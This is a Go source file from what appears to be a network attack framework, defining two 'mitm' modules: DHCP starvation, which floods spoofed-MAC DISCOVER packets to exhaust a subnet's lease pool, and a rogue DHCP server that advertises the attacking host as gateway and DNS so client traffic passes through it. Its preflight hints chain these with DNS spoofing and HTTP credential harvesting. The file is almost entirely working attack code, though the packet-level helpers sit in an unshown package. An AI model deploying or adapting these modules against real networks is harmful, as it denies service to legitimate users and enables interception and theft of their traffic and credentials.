package mitm

import (
	"fmt"
	"time"

	"github.com/qyvora/toha3ee/internal/attacks"
	"github.com/qyvora/toha3ee/internal/netx/dhcp"
	"github.com/qyvora/toha3ee/internal/safety"
)

// init registers the DHCP starvation and rogue-server modules.
func init() {
	attacks.Register(&DHCPStarve{})
	attacks.Register(&DHCPRogue{})
}

// DHCPStarve exhausts the DHCP lease pool by broadcasting DISCOVERs with
// spoofed client MACs, so legitimate clients can no longer obtain addresses.
// It is the standard prelude to dhcp.rogue.
type DHCPStarve struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*DHCPStarve) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:       "dhcp.starve",
		Category: "mitm",
		Risk:     attacks.RiskHigh, // active denial-of-service on address assignment
		Targets:  []string{"subnet"},
		// Sending spoofed-MAC DISCOVERs needs a raw socket so the chaddr field
		// can be forged on every packet.
		Requires:    []string{"cap.raw_socket"},
		Description: "DHCP starvation: exhaust the DHCP lease pool with spoofed-MAC DISCOVERs to deny address assignment",
		Limitations: "large pools take a while to exhaust; DHCP snooping on the switch drops spoofed-chaddr packets",
	}
}

// Preflight checks for the privileges and interface required to send raw
// UDP broadcast DISCOVERs.
func (*DHCPStarve) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "can bind UDP 68 broadcast")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
	} else {
		rep.AddOK("iface", ctx.Iface.String())
	}
	rep.AddFixable("followup", "run dhcp.rogue afterwards to take over address assignment")
	return rep, nil
}

// Run floods spoofed-chaddr DISCOVER packets until ctx.Done is closed,
// periodically beating the watchdog so the UI can report progress.
func (*DHCPStarve) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	st, err := dhcp.NewStarver()
	if err != nil {
		return fmt.Errorf("dhcp.starve: %w", err)
	}
	ctx.SetState("dhcp.starve", st)
	ctx.Safety.RegisterCleanup("dhcp.starve", "stop DHCP starvation", func() error {
		st.Close()
		return nil
	})

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("dhcp.starve", hb)

	// Each iteration of the outer loop fires a short burst of DISCOVERs with
	// freshly randomized client MACs, then paces itself so the socket and the
	// network are not overwhelmed in a single hammer.
	burst := 40
	ctx.Printf("[*] dhcp.starve flooding DISCOVERs with spoofed MACs on %s...\n", ctx.Iface.Name)
	for {
		select {
		case <-ctx.Done:
			return nil
		default:
		}
		for i := 0; i < burst; i++ {
			if err := st.SendDiscover(); err != nil {
				// A send failure usually means the kernel's ARP cache for the
				// DHCP server is missing; back off a moment before retrying.
				ctx.Printf("[!] dhcp.starve: %v\n", err)
				time.Sleep(time.Second)
				break
			}
		}
		hb.Beat()
		ctx.Printf("[dhcp.starve] sent %d spoofed DISCOVERs\n", st.Sent.Load())
		time.Sleep(500 * time.Millisecond)
	}
}

// Verify quantifies the starvation by reporting how many spoofed DISCOVERs
// were sent.
func (*DHCPStarve) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("dhcp.starve")
	if !ok {
		return &attacks.Impact{Summary: "DHCP starvation was active"}, nil
	}
	st := v.(*dhcp.Starver)
	imp := &attacks.Impact{Summary: fmt.Sprintf("sent %d spoofed DISCOVERs", st.Sent.Load())}
	imp.Add("discovers", fmt.Sprintf("%d", st.Sent.Load()))
	return imp, nil
}

// Cleanup stops the DISCOVER flood and releases the starver socket.
func (*DHCPStarve) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("dhcp.starve")
	ctx.Safety.UnregisterCleanup("dhcp.starve")
	if v, ok := ctx.GetState("dhcp.starve"); ok {
		v.(*dhcp.Starver).Close()
	}
	return nil
}

// DHCPRogue is the rogue DHCP server. After (or instead of) starving the real
// one, it answers every DISCOVER with an OFFER making this host the gateway
// and DNS resolver, so client traffic is redirected through the attacker.
type DHCPRogue struct{}

// Meta implements attacks.Module, returning the module's registry descriptor.
func (*DHCPRogue) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:       "dhcp.rogue",
		Category: "mitm",
		Risk:     attacks.RiskHigh,
		Targets:  []string{"subnet"},
		// Binding the DHCP server port 67 and crafting OFFERs on the wire needs
		// root and raw socket access.
		Requires:    []string{"cap.raw_socket"},
		Description: "rogue DHCP server: offer this host as gateway+DNS to every DHCP client to capture their traffic",
		Limitations: "the real DHCP server may win the race on answering clients; DHCP snooping blocks non-trusted-server offers",
	}
}

// Preflight checks for root and an interface, then hints at the recommended
// dhcp.starve -> dns.spoof -> http.harvest follow-up chain.
func (*DHCPRogue) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if err := safety.RequireRoot(); err == nil {
		rep.AddOK("root", "can bind UDP :67")
	} else {
		rep.AddBlocked("root", err.Error())
	}
	if ctx.Iface == nil {
		rep.AddBlocked("iface", "no interface configured")
		return rep, nil
	}
	rep.AddOK("iface", ctx.Iface.String())
	rep.AddFixable("posture", "run dhcp.starve first so clients must accept this host's OFFER; then run dns.spoof + http.harvest on top")
	return rep, nil
}

// Run starts the rogue responder and keeps beating the watchdog until the
// attack is stopped.
func (*DHCPRogue) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	if ctx.Iface == nil {
		return fmt.Errorf("dhcp.rogue: no interface configured")
	}
	// The responder is configured with this host's address so every OFFER
	// advertises us as gateway + DNS server to the requesting client.
	r := dhcp.NewResponder(dhcp.Config{ServerIP: ctx.Iface.IP})
	if err := r.Start(); err != nil {
		return fmt.Errorf("dhcp.rogue: %w", err)
	}
	ctx.SetState("dhcp.rogue", r)
	ctx.Safety.RegisterCleanup("dhcp.rogue", "stop rogue DHCP server", func() error {
		r.Stop()
		return nil
	})
	ctx.Printf("[*] dhcp.rogue serving OFFERs on :67, gateway+DNS = %s\n", ctx.Iface.IP)

	hb := safety.NewHeartbeat()
	ctx.Heartbeat = hb.Beat
	ctx.Safety.RegisterHeartbeat("dhcp.rogue", hb)
	for {
		select {
		case <-ctx.Done:
			return nil
		case <-time.After(2 * time.Second):
			hb.Beat()
		}
	}
}

// Verify reports the number of DISCOVERs answered with rogue OFFERs.
func (*DHCPRogue) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("dhcp.rogue")
	if !ok {
		return nil, fmt.Errorf("dhcp.rogue not running")
	}
	r := v.(*dhcp.Responder)
	imp := &attacks.Impact{
		// Offers is the count of DISCOVERs we answered; Queries is the raw
		// DHCP packet total observed on the socket.
		Summary: fmt.Sprintf("answered %d DISCOVERs with rogue OFFERs", r.Offers.Load()),
	}
	imp.Add("offers", fmt.Sprintf("%d", r.Offers.Load()))
	imp.Add("queries", fmt.Sprintf("%d", r.Queries.Load()))
	return imp, nil
}

// Cleanup stops the rogue DHCP server and restores normal addressing.
func (*DHCPRogue) Cleanup(ctx *attacks.AttackCtx) error {
	ctx.Safety.UnregisterHeartbeat("dhcp.rogue")
	ctx.Safety.UnregisterCleanup("dhcp.rogue")
	if v, ok := ctx.GetState("dhcp.rogue"); ok {
		v.(*dhcp.Responder).Stop()
	}
	return nil
}

// Compile-time assertions that both DHCP modules implement attacks.Module.
var _ attacks.Module = (*DHCPStarve)(nil)
var _ attacks.Module = (*DHCPRogue)(nil)
